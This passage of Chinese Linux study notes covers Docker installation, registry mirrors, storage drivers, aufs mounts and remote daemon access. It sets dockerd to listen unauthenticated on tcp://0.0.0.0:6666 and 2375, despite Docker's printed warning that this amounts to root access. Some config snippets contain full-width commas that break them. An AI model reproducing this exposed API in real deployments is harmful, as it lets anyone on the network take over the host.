Description=Docker Application Container Engine
Documentation=https://docs.docker.com
After=network-online.target firewalld.service
Wants=network-online.target

[Service]
Type=notify
# the default is not to use systemd for cgroups because the delegate issues still
# exists and systemd currently does not support the cgroup feature set required
# for containers run by docker
#add label-name and reomote visit functions
ExecStart=/usr/bin/dockerd -H unix://var/run/docker.sock --label="name=docker1-liu" -H tcp://0.0.0.0:6666
ExecReload=/bin/kill -s HUP \$MAINPID
# Having non-zero Limit*s causes performance problems due to accounting overhead
# in the kernel. We recommend using cgroups to do container-local accounting.
LimitNOFILE=infinity
LimitNPROC=infinity
LimitCORE=infinity
# Uncomment TasksMax if your systemd version supports it.
# Only systemd 226 and above support this version.
#TasksMax=infinity
TimeoutStartSec=0
# set delegate yes so that systemd does not reset the cgroups of docker containers
Delegate=yes
# kill only the docker process, not all processes in the cgroup
KillMode=process
# restart the docker process if it exits prematurely
Restart=on-failure
StartLimitBurst=3
StartLimitInterval=60s

[Install]
WantedBy=multi-user.target
EOF
    mkdir -p /etc/docker
    tee /etc/docker/daemon.json <<-'EOF'
{
    "registry-mirrors": [
        "https://h1ea2sza.mirror.aliyuncs.com",
        "https://docker.mirrors.ustc.edu.cn",
        "http://f1361db2.m.daocloud.io",
        "https://registry.docker-cn.com",
        "https://dockerhub.azk8s.cn",
        "https://reg-mirror.qiniu.com",
        "https://hub-mirror.c.163.com",
        "https://mirror.ccs.tencentyun.com"
    ]
}
EOF
    systemctl daemon-reload
    systemctl enable --now docker &> /dev/null
    systemctl is-active docker &> /dev/null && ${COLOR}"Docker 服务启动成功"${END} || { ${COLOR}"Docker 启动失败"${END};exit; }
    docker version && ${COLOR}"Docker 安装成功"${END} || ${COLOR}"Docker 安装失败"${END}
}

set_swap_limit(){
    if [ ${OS_ID} == "Ubuntu" ];then
        ${COLOR}'设置Docker的"WARNING: No swap limit support"警告'${END}
        sed -ri '/^GRUB_CMDLINE_LINUX=/s@"$@ swapaccount=1"@' /etc/default/grub
        update-grub &> /dev/null
        ${COLOR}"10秒后，机器会自动重启"${END}
        sleep 10
        reboot
    fi
}


set_centos_alias(){
    cat >>~/.bashrc <<-EOF
alias cdnet="cd /etc/sysconfig/network-scripts"
alias vie0="vim /etc/sysconfig/network-scripts/ifcfg-eth0"
alias vie1="vim /etc/sysconfig/network-scripts/ifcfg-eth1"
alias scandisk="echo '- - -' > /sys/class/scsi_host/host0/scan;echo '- - -' > /sys/class/scsi_host/host1/scan;echo '- - -' > /sys/class/scsi_host/host2/scan"
alias rmi="docker images -qa|xargs docker rmi -f"
alias rmc="docker ps -qa|xargs docker rm -f"
EOF
source ~/.bashrc
}


set_ubuntu_alias(){
    cat >>~/.bashrc <<-EOF
alias cdnet="cd /etc/netplan"
alias scandisk="echo '- - -' > /sys/class/scsi_host/host0/scan;echo '- - -' > /sys/class/scsi_host/host1/scan;echo '- - -' > /sys/class/scsi_host/host2/scan"
EOF
alias rmi="docker images -qa|xargs sudo docker rmi -f"
alias rmc="docker ps -qa|xargs sudo docker rm -f"
sudo source ~/.bashrc
}


set_alias(){
    if [ ${OS_ID} == "CentOS" ] &> /dev/null;then
        set_centos_alias        
    else
        set_ubuntu_alias
    fi
}

main(){
    os
    check_file
    install
    set_alias
    set_swap_limit
}

main
```

##### 48.5.2.4 安装podman

```
#在CentOS8上安装docker会自动安装podman,docker工具只是一个脚本，调用了Podman
[root@centos8 ~]#dnf install podman -y
[root@centos8 ~]#rpm -ql podman-docker
/usr/bin/docker
[root@centos8 ~]#cat /usr/bin/docker
#!/bin/sh
[ -f /etc/containers/nodocker ] || \
echo "Emulate Docker CLI using podman. Create /etc/containers/nodocker to quiet 
msg." >&2
exec /usr/bin/podman "$@"
[root@centos8 ~]#podman version
Version:            1.4.2-stable2
RemoteAPI Version:  1
Go Version:         go1.12.8
OS/Arch:           linux/amd64


#修改拉取镜像的地址的顺序，提高速度
[root@centos8 ~]#vim /etc/containers/registries.conf
[registries.search]
registries = ['docker.io'，'quay.io'，'registry.redhat.io', 
'registry.access.redhat.com']  
```

#### 48.5.3 Docker镜像加速

```
浏览器打开http://cr.console.aliyun.com，注册或登录阿里云账号，点击左侧的镜像加速器，将会得到一个专属的加速地址，而且下面有使用配置说明:
```

![1659270403804](linux体系.assets/1659270403804.png)

```
1. 安装／升级Docker客户端
推荐安装1.10.0以上版本的Docker客户端，参考文档docker-ce

2. 配置镜像加速器
针对Docker客户端版本大于1.10.0 的用户
您可以通过修改daemon配置文件/etc/docker/daemon.json来使用加速器
[root@centos7 ~]# sudo mkdir -p /etc/docker
[root@centos7 ~]# sudo tee /etc/docker/daemon.json <<-'EOF'
{
  "registry-mirrors": ["https://h1ea2sza.mirror.aliyuncs.com"]
}
EOF

#网易云: http://hub-mirror.c.163.com/
#腾讯云: https://mirror.ccs.tencentyun.com
[root@centos7 ~]# sudo systemctl daemon-reload
[root@centos7 ~]# sudo systemctl restart docker
```

#### 48.5.4 Docker服务进程

##### 48.5.4.1 docker的进程关系

```
docker相关的四个进程:
1）dockerd: 服务器程序,被client直接访问，其父进程为宿主机的systemd守护进程。
2）docker-proxy: 每个进程docker-proxy实现对应一个需要网络通信的容器，管理宿主机和容器的之间端口映射，其父进程为dockerd，如果容器不需要网络则无需启动。
3）containerd: 被dockerd进程调用以实现与runc交互。
4）containerd-shim: 真正运行容器的载体，每个容器对应一个containerd-shim进程，其父进程为containerd。
```

##### 48.5.4.2 容器的创建与管理过程

**通信流程:** 

![1659272154294](linux体系.assets/1659272154294.png)

```
1. dockerd通过grpc和 containerd模块通信，dockerd由libcontainerd负责和containerd进行交换，dockerd和containerd 通信socket文件: /run/containerd/containerd.sock。
2. containerd在dockerd启动时被启动，然后containerd启动grpc请求监听，containerd处理grpc请求，根据请求做相应动作。
3. 若是run, start或是exec 容器，containerd 拉起一个container-shim , 并进行相应的操作。
4. container-shim别拉起后，start/exec/create拉起runC进程，通过exit、control文件和containerd通信，通过父子进程关系和SIGCHLD监控容器中进程状态。
5. 在整个容器生命周期中，containerd通过epoll监控容器文件，监控容器事件。
```

 **gRPC简介**

![1659272511460](linux体系.assets/1659272511460.png)

```
gRPC是Google开发的一款高性能、开源和通用的 RPC 框架，支持众多语言客户端。
官网: https://www.grpc.io/
```

##### 48.5.4.3 docker存储引擎

```
官方文档关于存储引擎的相关文档: 
https://docs.docker.com/storage/storagedriver/
https://docs.docker.com/storage/storagedriver/select-storage-driver/


1）AUFS: （Advanced Mult-Layered Unification Filesystem，版本2之前旧称AnotherUnionFS）是一种Union FS ，是文件级的存储驱动。Aufs是之前的UnionFS的重新实现，2006年由Junjiro Okajima开发。

所谓 UnionFS就是把不同物理位置的目录合并 mount 到同一个目录中。简单来说就是支持将不同目录挂载到一个虚拟文件系统下的。这种可以层层地叠加修改文件。无论底下有多少都是只读的，最上系统可写的。当需要修改一个文件时， AUFS 创建该文件的一个副本，使用 CoW 将文件从只读层复制到可写进行修改，结果也保存在Docker 中，底下的只读层就是 image，可写层就是Container。

aufs 被拒绝合并到主线 Linux 。其代码被批评为"dense, unreadable, uncommented 密集、不可读、未注释"。 相反，OverlayFS被合并到 Linux 内核中。在多次尝试将 aufs 合并到主线内核失败后，作者放弃了AUFS 是 Docker 18.06 及更早版本的首选存储驱动程序，在内核 3.13 上运行 Ubuntu 14.04 时不支持overlay2。


2）Overlay: 一种 Union FS 文件系统， Linux 内核3.18后支持。
Overlay2: Overlay 的升级版，到目前为止，所有 Linux 发行版推荐使用的存储类 型，也是docker默认使用的存储引擎为overlay2，需要磁盘分区支持d-type功能，因此需要系统磁盘的额外支持,相对AUFS来说Overlay2 有以下优势: 更简单地设计； 从3.18开始就进入了Linux内核主线；资源消耗更少。


3）devicemapper: 因为CentOS 7.2和RHEL 7.2 的之前版本内核版本不支持 overlay2，默认使用的存储驱动程序，最大数据容量只支持100GB且性能不佳，当前较新版本的CentOS 已经支持overlay2， 因此推荐使用 overlay2,另外此存储引擎已在Docker Engine 18.09中弃用。


4）vfs: 用于测试环境，适用于无法使用 copy-on -writewrite 时的情况。 此存储驱动程序的性能很差，通常不建议用于生产。
```

**范例: 在CentOS7.2修改存储引擎**

```
[root@centos7 ~]#vim /lib/systemd/system/docker.service
.....
ExecStart=/usr/bin/dockerd -s overlay2 -H fd:// --
containerd=/run/containerd/containerd.sock
......


#创建新的xfs分区,添加ftype特性,否则默认无法启动docker服务
[root@centos7 ~]#mkfs.xfs -n ftype=1 /dev/sdb
[root@centos7 ~]#mount /dev/sdb /var/lib/docker
[root@centos7 ~]#systemctl daemon-reload
[root@centos7 ~]#systemctl restart docker
```

**注意:修改存储引擎会导致所有容器丢失,所以先备份再修改**

```
#查看Ubuntu1804的默认存储引擎
[root@ubuntu1804 ~]#docker info |grep Storage
WARNING: No swap limit support
 Storage Driver: overlay2
 
 
 
#查看CentOS7.9的默认存储引擎
[root@centos7 ~]# docker info |grep Storage
 Storage Driver: overlay2
WARNING: API is accessible on http://0.0.0.0:6666 without encryption.
         Access to the remote API is equivalent to root access on the host. Refer
         to the 'Docker daemon attack surface' section in the documentation for
         more information: https://docs.docker.com/engine/security/security/#docker-daemon-attack-surface
```

**范例: aufs 实现联合文件系统挂载**

```
#查看是否支持联合文件系统
只有ubuntu支持，centos7,centos8不支持
[18:30:04 liu@ubuntu1804 ~]$sudo modinfo aufs
[sudo] password for liu: 
filename:       /lib/modules/4.15.0-156-generic/kernel/fs/aufs/aufs.ko
alias:          fs-aufs
version:        4.15-20180219
description:    aufs -- Advanced multi layered unification filesystem
author:         Junjiro R. Okajima <aufs-users@lists.sourceforge.net>
license:        GPL
srcversion:     3B98A3024641F90739B8365
depends:        
retpoline:      Y
intree:         Y
name:           aufs
vermagic:       4.15.0-156-generic SMP mod_unload modversions 
signat:         PKCS#7
signer:         
sig_key:        
sig_hashalgo:   md4
parm:           brs:use <sysfs>/fs/aufs/si_*/brN (int)
parm:           allow_userns:allow unprivileged to mount under userns (bool)


[root@ubuntu1804 ~]#grep -i aufs /boot/config-4.15.0-29-generic 
CONFIG_AUFS_FS=m
CONFIG_AUFS_BRANCH_MAX_127=y
# CONFIG_AUFS_BRANCH_MAX_511 is not set
# CONFIG_AUFS_BRANCH_MAX_1023 is not set
# CONFIG_AUFS_BRANCH_MAX_32767 is not set
CONFIG_AUFS_SBILIST=y
# CONFIG_AUFS_HNOTIFY is not set
CONFIG_AUFS_EXPORT=y
CONFIG_AUFS_INO_T_64=y
CONFIG_AUFS_XATTR=y
# CONFIG_AUFS_FHSM is not set
# CONFIG_AUFS_RDU is not set
CONFIG_AUFS_DIRREN=y
# CONFIG_AUFS_SHWH is not set
# CONFIG_AUFS_BR_RAMFS is not set
# CONFIG_AUFS_BR_FUSE is not set
CONFIG_AUFS_BR_HFSPLUS=y
CONFIG_AUFS_BDEV_LOOP=y
# CONFIG_AUFS_DEBUG is not set

[root@ubuntu1804 ~]#mkdir dir{1,2}
[root@ubuntu1804 ~]#echo here is dir1 > dir1/file1
[root@ubuntu1804 ~]#echo here is dir2 > dir2/file2

[root@ubuntu1804 ~]#mkdir /data/aufs


#把两个文件夹挂载(联合)到同一目录下
[root@ubuntu1804 ~]#mount -t aufs -o br=/root/dir1=ro:/root/dir2=rw none /data/aufs
[root@ubuntu1804 ~]#ll /data/aufs/
total 16
drwxr-xr-x 4 root root 4096 Jan 25 16:22 ./
drwxr-xr-x 4 root root 4096 Jan 25 16:22 ../
-rw-r--r-- 1 root root   13 Jan 25 16:22 file1
-rw-r--r-- 1 root root   13 Jan 25 16:22 file2

[root@ubuntu1804 ~]#cat /data/aufs/file1
here is dir1
[root@ubuntu1804 ~]#cat /data/aufs/file2
here is dir2
[root@ubuntu1804 ~]#df -T
Filesystem     Type     1K-blocks   Used Available Use% Mounted on
udev           devtmpfs    462560       0    462560   0% /dev
tmpfs         tmpfs        98512   10296     88216  11% /run
/dev/sda2     ext4      47799020 2770244  42570972   7% /
tmpfs         tmpfs       492552       0    492552   0% /dev/shm
tmpfs         tmpfs         5120       0      5120   0% /run/lock
tmpfs         tmpfs       492552       0    492552   0% /sys/fs/cgroup
/dev/sda3     ext4      19091540   45084  18053588   1% /data
/dev/sda1     ext4        944120   77112    801832   9% /boot
tmpfs         tmpfs        98508       0     98508   0% /run/user/0
none          aufs      47799020 2770244  42570972   7% /data/aufs


[root@ubuntu1804 ~]#echo write to file1 >> /data/aufs/file1
-bash: /data/aufs/file1: Read-only file system
[root@ubuntu1804 ~]#echo write to file2 >> /data/aufs/file2
[root@ubuntu1804 ~]#cat /data/aufs/file1
here is dir1
[root@ubuntu1804 ~]#cat /data/aufs/file2
here is dir2
write to file2
```

**范例: 修改存储引擎**

```
[root@ubuntu1804 ~]#sudo systemctl stop docker
[root@ubuntu1804 ~]#cat /etc/docker/daemon.json
#centos7,8不支持，可以在ubuntu上操作
{
   "registry-mirrors": ["https://h1ea2sza.mirror.aliyuncs.com"]，
   "storage-driver": "aufs"
}
[root@centos8 ~]# systemctl daemon-reload
[root@centos8 ~]# systemctl restart docker



#查看存储引擎
Client:
 Debug Mode: false

Server:
 Containers: 0
  Running: 0
  Paused: 0
  Stopped: 0
 Images: 0
 Server Version: 19.03.13
 Storage Driver: aufs   存储引擎已经变了！！！
  Root Dir: /var/lib/docker/aufs
  Backing Filesystem: extfs
  Dirs: 0
  Dirperm1 Supported: true
 Logging Driver: json-file
 Cgroup Driver: cgroupfs
 Plugins:
  Volume: local
  Network: bridge host ipvlan macvlan null overlay
  Log: awslogs fluentd gcplogs gelf journald json-file local logentries splunk syslog
 Swarm: inactive
 Runtimes: runc
 Default Runtime: runc
 Init Binary: docker-init
 containerd version: 8fba4e9a7d01810a393d5d25a3621dc101981175
 runc version: dc9208a3303feef5b3839f4323d9beb36df0a9dd
 init version: fec3683
 Security Options:
  apparmor
  seccomp
   Profile: default
 Kernel Version: 4.15.0-156-generic
 Operating System: Ubuntu 18.04.6 LTS
 OSType: linux
 Architecture: x86_64
 CPUs: 2
 Total Memory: 1.924GiB
 Name: ubuntu1804
 ID: WVPQ:HKMF:ISZH:AL6X:OG5J:PWNM:KVB2:HLBQ:APEO:R3K3:U3DR:VJVN
 Docker Root Dir: /var/lib/docker
 Debug Mode: false
 Registry: https://index.docker.io/v1/
 Labels:
  name=docker1-liu
 Experimental: false
 Insecure Registries:
  127.0.0.0/8
 Registry Mirrors:
  https://h1ea2sza.mirror.aliyuncs.com/
 Live Restore Enabled: false
 Product License: Community Engine

WARNING: API is accessible on http://0.0.0.0:6666 without encryption.
         Access to the remote API is equivalent to root access on the host. Refer
         to the 'Docker daemon attack surface' section in the documentation for
         more information: https://docs.docker.com/engine/security/security/#docker-daemon-attack-surface
WARNING: the aufs storage-driver is deprecated, and will be removed in a future release.
```

#### 48.5.5 Docker服务管理

**docker 服务基于C/S 结构,可以实现基于本地和远程方式进行管理**

```
#Dockerd守护进程启动选项
-H tcp://host:port
 unix:///path/to/socket,
 fd://* or fd://socketfd
#守护进程默认配置:
-H unix:///var/run/docker.sock


#使用Docker客户端命令选项
-H tcp://host:port
   unix:///path/to/socket,
   fd://* or fd://socketfd
客户端默认配置:
-H unix:///var/run/docker.sock


#docker客户端也可以使用环境变量DOCKER_ HOST,代替-H选项
export DOCKER_HOST="tcp://docker-server:2375"
```

##### 48.5.5.1 docker服务添加标签

```
[09:39:13 liu@ubuntu1804 ~]$sudo vim /lib/systemd/system/docker.service
#修改下面行
ExecStart=/usr/bin/dockerd -H unix://var/run/docker.sock --label="name=docker1-liu"

[10:18:44 liu@ubuntu1804 ~]$sudo systemctl daemon-reload
[10:19:02 liu@ubuntu1804 ~]$sudo systemctl restart docker
[10:19:18 liu@ubuntu1804 ~]$sudo docker info
`Client:
 Debug Mode: false

Server:
 Containers: 2
  Running: 0
  Paused: 0
  Stopped: 2
 Images: 1
 Server Version: 19.03.13
 Storage Driver: overlay2
  Backing Filesystem: extfs
  Supports d_type: true
  Native Overlay Diff: true
 Logging Driver: json-file
 Cgroup Driver: cgroupfs
 Plugins:
  Volume: local
  Network: bridge host ipvlan macvlan null overlay
  Log: awslogs fluentd gcplogs gelf journald json-file local logentries splunk syslog
 Swarm: inactive
 Runtimes: runc
 Default Runtime: runc
 Init Binary: docker-init
 containerd version: 8fba4e9a7d01810a393d5d25a3621dc101981175
 runc version: dc9208a3303feef5b3839f4323d9beb36df0a9dd
 init version: fec3683
 Security Options:
  apparmor
  seccomp
   Profile: default
 Kernel Version: 4.15.0-156-generic
 Operating System: Ubuntu 18.04.6 LTS
 OSType: linux
 Architecture: x86_64
 CPUs: 2
 Total Memory: 1.924GiB
 Name: ubuntu1804
 ID: WVPQ:HKMF:ISZH:AL6X:OG5J:PWNM:KVB2:HLBQ:APEO:R3K3:U3DR:VJVN
 Docker Root Dir: /var/lib/docker
 Debug Mode: false
 Registry: https://index.docker.io/v1/
 Labels:
  name=docker1-liu   #标签成功！！！
 Experimental: false
 Insecure Registries:
  127.0.0.0/8
 Registry Mirrors:
  https://h1ea2sza.mirror.aliyuncs.com/
  https://docker.mirrors.ustc.edu.cn/
  http://f1361db2.m.daocloud.io/
  https://registry.docker-cn.com/
  https://dockerhub.azk8s.cn/
  https://reg-mirror.qiniu.com/
  https://hub-mirror.c.163.com/
  https://mirror.ccs.tencentyun.com/
 Live Restore Enabled: false
 Product License: Community Engine+
```

##### 48.5.5.2开启docker的远程访问

```
#方法1
[10:19:38 liu@ubuntu1804 ~]$sudo vim /lib/systemd/system/docker.service
#修改下面行
ExecStart=/usr/bin/dockerd -H unix://var/run/docker.sock --label="name=docker1-liu" -H tcp://0.0.0.0:6666



#方法2
[root@ubuntu1804 ~]#vim /lib/systemd/system/docker.service
[root@ubuntu1804 ~]#vim /lib/systemd/system/docker.service
ExecStart=/usr/bin/dockerd  --containerd=/run/containerd/containerd.sock
[root@ubuntu1804 ~]#vim /etc/docker/daemon.json
{  
 "hosts": ["tcp://0.0.0.0:2375", "fd://"] 
}
[root@ubuntu1804 ~]#systemctl daemon-reload
[root@ubuntu1804 ~]#systemctl restart docker



#查看端口号
[11:08:32 liu@ubuntu1804 ~]$ss -ntl
State   Recv-Q   Send-Q      Local Address:Port       Peer Address:Port   
LISTEN  0        128         127.0.0.53%lo:53              0.0.0.0:*      
LISTEN  0        128               0.0.0.0:22              0.0.0.0:*      
LISTEN  0        128             127.0.0.1:6010            0.0.0.0:*      
LISTEN  0        128                     *:6666                  *:*      #端口已经被打开
LISTEN  0        128                  [::]:22                 [::]:*      
LISTEN  0        128                 [::1]:6010               [::]:*




#实现远程访问方式1
[root@centos8 ~]# curl http://10.0.0.156:6666/info |grep liu
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2727    0  2727    0     0   110k      0 --:--:-- --:--:-- --:--:--  110k
{"ID":"WVPQ:HKMF:ISZH:AL6X:OG5J:PWNM:KVB2:HLBQ:APEO:R3K3:U3DR:VJVN","Containers":3,"ContainersRunning":0,"ContainersPaused":0,"ContainersStopped":3,"Images":1,"Driver":"overlay2","DriverStatus":[["Backing Filesystem","extfs"],["Supports d_type","true"],["Native Overlay Diff","true"]],"SystemStatus":null,"Plugins":{"Volume":["local"],"Network":["bridge","host","ipvlan","macvlan","null","overlay"],"Authorization":null,"Log":["awslogs","fluentd","gcplogs","gelf","journald","json-file","local","logentries","splunk","syslog"]},"MemoryLimit":true,"SwapLimit":true,"KernelMemory":true,"KernelMemoryTCP":true,"CpuCfsPeriod":true,"CpuCfsQuota":true,"CPUShares":true,"CPUSet":true,"PidsLimit":true,"IPv4Forwarding":true,"BridgeNfIptables":true,"BridgeNfIp6tables":true,"Debug":false,"NFd":23,"OomKillDisable":true,"NGoroutines":41,"SystemTime":"2022-08-01T11:25:34.064856664+08:00","LoggingDriver":"json-file","CgroupDriver":"cgroupfs","NEventsListener":0,"KernelVersion":"4.15.0-156-generic","OperatingSystem":"Ubuntu 18.04.6 LTS","OSType":"linux","Architecture":"x86_64","IndexServerAddress":"https://index.docker.io/v1/","RegistryConfig":{"AllowNondistributableArtifactsCIDRs":[],"AllowNondistributableArtifactsHostnames":[],"InsecureRegistryCIDRs":["127.0.0.0/8"],"IndexConfigs":{"docker.io":{"Name":"docker.io","Mirrors":["https://h1ea2sza.mirror.aliyuncs.com/"],"Secure":true,"Official":true}},"Mirrors":["https://h1ea2sza.mirror.aliyuncs.com/"]},"NCPU":2,"MemTotal":2065862656,"GenericResources":null,"DockerRootDir":"/var/lib/docker","HttpProxy":"","HttpsProxy":"","NoProxy":"","Name":"ubuntu1804","Labels":["name=docker1-liu"],  #在这里 "ExperimentalBuild":false,"ServerVersion":"19.03.13","ClusterStore":"","ClusterAdvertise":"","Runtimes":{"runc":{"path":"runc"}},"DefaultRuntime":"runc","Swarm":{"NodeID":"","NodeAddr":"","LocalNodeState":"inactive","ControlAvailable":false,"Error":"","RemoteManagers":null},"LiveRestoreEnabled":false,"Isolation":"","InitBinary":"docker-init","ContainerdCommit":{"ID":"8fba4e9a7d01810a393d5d25a3621dc101981175","Expected":"8fba4e9a7d01810a393d5d25a3621dc101981175"},"RuncCommit":{"ID":"dc9208a3303feef5b3839f4323d9beb36df0a9dd","Expected":"dc9208a3303feef5b3839f4323d9beb36df0a9dd"},"InitCommit":{"ID":"fec3683","Expected":"fec3683"},"SecurityOptions":["name=apparmor","name=seccomp,profile=default"],"ProductLicense":"Community Engine","Warnings":["WARNING: API is accessible on http://0.0.0.0:6666 without encryption.\n         Access to the remote API is equivalent to root access on the host. Refer\n         to the 'Docker daemon attack surface' section in the documentation for\n         more information: https://docs.docker.com/engine/security/security/#docker-daemon-attack-surface"]}



#实现远程访问方式2
[root@centos8 ~]# docker -H tcp://10.0.0.156:6666 info
Client:
 Debug Mode: false

Server:
 Containers: 3
  Running: 0
  Paused: 0
  Stopped: 3
 Images: 1
 Server Version: 19.03.13
 Storage Driver: overlay2
  Backing Filesystem: extfs
  Supports d_type: true
  Native Overlay Diff: true
 Logging Driver: json-file
 Cgroup Driver: cgroupfs
 Plugins:
  Volume: local
  Network: bridge host ipvlan macvlan null overlay
  Log: awslogs fluentd gcplogs gelf journald json-file local logentries splunk syslog
 Swarm: inactive
 Runtimes: runc
 Default Runtime: runc
 Init Binary: docker-init
 containerd version: 8fba4e9a7d01810a393d5d25a3621dc101981175
 runc version: dc9208a3303feef5b3839f4323d9beb36df0a9dd
 init version: fec3683
 Security Options:
  apparmor
  seccomp
   Profile: default
 Kernel Version: 4.15.0-156-generic
 Operating System: Ubuntu 18.04.6 LTS
 OSType: linux
 Architecture: x86_64
 CPUs: 2
 Total Memory: 1.924GiB
 Name: ubuntu1804
 ID: WVPQ:HKMF:ISZH:AL6X:OG5J:PWNM:KVB2:HLBQ:APEO:R3K3:U3DR:VJVN
 Docker Root Dir: /var/lib/docker
 Debug Mode: false
 Registry: https://index.docker.io/v1/
 Labels:
  name=docker1-liu    #跨网络成功！！
 Experimental: false
 Insecure Registries:
  127.0.0.0/8
 Registry Mirrors:
  https://h1ea2sza.mirror.aliyuncs.com/
 Live Restore Enabled: false
 Product License: Community Engine

WARNING: API is accessible on http://0.0.0.0:6666 without encryption.
         Access to the remote API is equivalent to root access on the host. Refer
         to the 'Docker daemon attack surface' section in the documentation for
         more information: https://docs.docker.com/engine/security/security/#docker-daemon-attack-surface
         
         
         
         
#实现远程访问方式3
[root@centos8 ~]# export DOCKER_HOST="tcp://10.0.0.156:6666"
[root@centos8 ~]# docker info
Client:
 Debug Mode: false

Server:
 Containers: 3
  Running: 0
  Paused: 0
  Stopped: 3
 Images: 1
 Server Version: 19.03.13
 Storage Driver: overlay2
  Backing Filesystem: extfs
  Supports d_type: true
  Native Overlay Diff: true
 Logging Driver: json-file
 Cgroup Driver: cgroupfs
 Plugins:
  Volume: local
  Network: bridge host ipvlan macvlan null overlay
  Log: awslogs fluentd gcplogs gelf journald json-file local logentries splunk syslog
 Swarm: inactive
 Runtimes: runc
 Default Runtime: runc
 Init Binary: docker-init
 containerd version: 8fba4e9a7d01810a393d5d25a3621dc101981175
 runc version: dc9208a3303feef5b3839f4323d9beb36df0a9dd
 init version: fec3683
 Security Options:
  apparmor
  seccomp
   Profile: default
 Kernel Version: 4.15.0-156-generic
 Operating System: Ubuntu 18.04.6 LTS
 OSType: linux
 Architecture: x86_64
 CPUs: 2
 Total Memory: 1.924GiB
 Name: ubuntu1804
 ID: WVPQ:HKMF:ISZH:AL6X:OG5J:PWNM:KVB2:HLBQ:APEO:R3K3:U3DR:VJVN
 Docker Root Dir: /var/lib/docker
 Debug Mode: false
 Registry: https://index.docker.io/v1/
 Labels:
  name=docker1-liu    #跨网络成功！！
 Experimental: false
 Insecure Registries:
  127.0.0.0/8
 Registry Mirrors:
  https://h1ea2sza.mirror.aliyuncs.com/
 Live Restore Enabled: false
 Product License: Community Engine

WARNING: API is accessible on http://0.0.0.0:6666 without encryption.
         Access to the remote API is equivalent to root access on the host. Refer
         to the 'Docker daemon attack surface' section in the documentation for
         more information: https://docs.docker.com/engine/security/security/#docker-daemon-attack-surface
         
         
         
#恢复连接本机
[root@centos8 ~]# unset DOCKER_HOST
[root@centos8 ~]# docker info
Client:
 Debug Mode: false

Server:
 Containers: 2
  Running: 0
  Paused: 0
  Stopped: 2
 Images: 1
 Server Version: 19.03.13
 Storage Driver: overlay2
  Backing Filesystem: xfs
  Supports d_type: true
  Native Overlay Diff: true
 Logging Driver: json-file
 Cgroup Driver: cgroupfs
 Plugins:
  Volume: local
  Network: bridge host ipvlan macvlan null overlay
  Log: awslogs fluentd gcplogs gelf journald json-file local logentries splunk syslog
 Swarm: inactive
 Runtimes: runc
 Default Runtime: runc
 Init Binary: docker-init
 containerd version: 8fba4e9a7d01810a393d5d25a3621dc101981175
 runc version: dc9208a3303feef5b3839f4323d9beb36df0a9dd
 init version: fec3683
 Security Options:
  seccomp
   Profile: default
 Kernel Version: 4.18.0-193.el8.x86_64
 Operating System: CentOS Linux 8 (Core)
 OSType: linux
 Architecture: x86_64
 CPUs: 2
 Total Memory: 1.758GiB
 Name: centos8
 ID: 5KJV:5MQ3:5NS2:EDES:BWGH:AG53:ALVS:HSOY:QLRU:N7XR:A62F:TVJK
 Docker Root Dir: /var/lib/docker
 Debug Mode: false
 Registry: https://index.docker.io/v1/
 Labels:
 Experimental: false
 Insecure Registries:
  127.0.0.0/8
 Registry Mirrors:
  https://h1ea2sza.mirror.aliyuncs.com/
 Live Restore Enabled: false
 Product License: Community Engine
```

##### 48.5.5.3 解决SWAP报警提示

```
[20:36:31 liu@ubuntu1804 ~]$sudo docker info 
...
WARNING: No swap limit support

[20:36:31 liu@ubuntu1804 ~]$sudo vim /etc/default/grub
只有ubuntu需要修改,centos没有这个提示
GRUB_DEFAULT=0
GRUB_TIMEOUT_STYLE=hidden
GRUB_TIMEOUT=2
GRUB_DISTRIBUTOR=`lsb_release -i -s 2> /dev/null || echo Debian`
GRUB_CMDLINE_LINUX_DEFAULT=""
GRUB_CMDLINE_LINUX=" net.ifnames=0 swapaccount=1" #修改此行令swapaccount=1

[20:36:31 liu@ubuntu1804 ~]$sudo update-grub
[20:36:31 liu@ubuntu1804 ~]$sudo reboot
```

#### 48.5.6 镜像管理

##### 48.5.6.1 镜像结构和原理

![1659325479046](linux体系.assets/1659325479046.png)

```
镜像即创建容器的模版，含有启动容器所需要的文件系统及所需要的内容，因此镜像主要用于方便和快速的创建并启动容器。

镜像含里面是一层层的文件系统,叫做Union FS（联合文件系统）,联合文件系统，可以将几层目录挂载到一起（就像千层饼，洋葱头，俄罗斯套娃一样），形成一个虚拟文件系统,虚拟文件系统的目录结构就像普通 linux 的目录结构一样，镜像通过这些文件再加上宿主机的内核共同提供了一个 linux 的虚拟环境，每一层文件系统叫做一层 layer，联合文件系统可以对每一层文件系统设置三种权限，只读（readonly）、读写（readwrite）和写出（whiteout-able），但是镜像中每一层文件系统都是只读的,构建镜像的时候，从一个最基本的操作系统开始，每个构建提交的操作都相当于做一层的修改，增加了一层文件系统，一层层往上叠加，上层的修改会覆盖底层该位置的可见性，这也很容易理解，就像上层把底层遮住了一样，当使用镜像的时候，我们只会看到一个完全的整体，不知道里面有几层,实际上也不需要知道里面有几层，结构如下:
```

![1659326895845](linux体系.assets/1659326895845.png)

```
一个典型的 Linux文件系统由 bootfs 和 rootfs 两部分组成：

bootfs(boot file system) 主要包含bootloader和kernel，bootloader主要用于引导加载 kernel，Linux刚启动时会加载bootfs文件系统,当boot加载完成后,kernel 被加载到内存中后接管系统的控制权,bootfs会被umount掉。

rootfs (root file system) 包含的就是典型 Linux 系统中的/dev，/proc，/bin，/etc 等标准目录和文件，不同的 linux 发行版（如 ubuntu 和 CentOS ) 主要在 rootfs 这一层会有所区别。

一般的镜像通常都比较小，官方提供的Ubuntu镜像只有60MB多点，而 CentOS 基础镜像也只有200MB左右，一些其他版本的镜像甚至只有几MB，比如: busybox 才1.22MB，alpine镜像也只有5M左右。镜像直接调用宿主机的内核，镜像中只提供rootfs，也就是只需要包括最基本的命令,配置文件和程序库等相关文件就可以了。

下图就是有两个不同的镜像在一个宿主机内核上实现不同的rootfs。
```

![1659327194494](linux体系.assets/1659327194494.png)

**容器、镜像和父镜像关系:** 

![1659327242895](linux体系.assets/1659327242895.png)

**范例: 查看镜像的分层结构**

```
[root@centos7 ~]# docker pull nginx
Using default tag: latest
latest: Pulling from library/nginx
a2abf6c4d29d: Pull complete 
a9edb18cadd1: Pull complete 
589b7251471a: Pull complete 
186b1aaa4aa6: Pull complete 
b4df32aa5a72: Pull complete 
a0bcbecc962e: Pull complete 
Digest: sha256:0d17b565c37bcbd895e9d92315a05c1c3c9a29f762b011a10c54a66cd53c9b31
Status: Downloaded newer image for nginx:latest
docker.io/library/nginx:latest



